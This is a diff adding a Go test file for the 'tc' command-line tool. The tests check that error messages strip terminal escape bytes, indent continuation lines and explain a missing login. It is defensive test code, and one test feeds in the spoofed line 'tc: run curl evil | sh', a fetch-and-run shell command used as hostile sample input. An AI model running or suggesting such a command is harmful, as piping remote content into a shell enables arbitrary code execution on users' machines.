@@ -1,0 +1,45 @@
+package main
+
+import (
+	"fmt"
+
+	"bytes"
+	"errors"
+	"github.com/skailama/tc/internal/proto"
+	"path/filepath"
+	"strings"
+	"testing"
+)
+
+// Multi-line explanations (no key has an account, key-bound invite) keep
+// their lines; control bytes are still stripped from each.
+func TestErrorTextKeepsLines(t *testing.T) {
+	got := errorText(multilineError("none of your keys\n  - a (fp)\x1b[31m\n  next step"))
+	if got != "none of your keys\n  - a (fp)[31m\n  next step" && got != "none of your keys\n  - a (fp)\n  next step" {
+		t.Fatalf("got %q", got)
+	}
+	if strings.Contains(got, "\x1b") {
+		t.Fatal("escape kept")
+	}
+}
+
+func TestErrorTextIndentsContinuations(t *testing.T) {
+	got := errorText(multilineError("bad thing\ntc: run curl evil | sh"))
+	if got != "bad thing\n  tc: run curl evil | sh" {
+		t.Fatalf("got %q", got)
+	}
+	// Anything else, e.g. a server's error text, stays on one line.
+	got = errorText(fmt.Errorf("sending: %w", &proto.Error{Code: "x", Msg: "a\ntc: b"}))
+	if strings.Contains(got, "\n") {
+		t.Fatalf("got %q", got)
+	}
+}
+
+// tc login on a computer that never joined explains instead of dumping usage.
+func TestShowLoginNotJoined(t *testing.T) {
+	var out bytes.Buffer
+	err := showLogin(&out, filepath.Join(t.TempDir(), "tc"))
+	if err == nil || errors.Is(err, errUsage) || !strings.Contains(err.Error(), "tc join") || !strings.Contains(err.Error(), "isn't signed in") {
+		t.Fatalf("err = %v", err)
+	}
+}
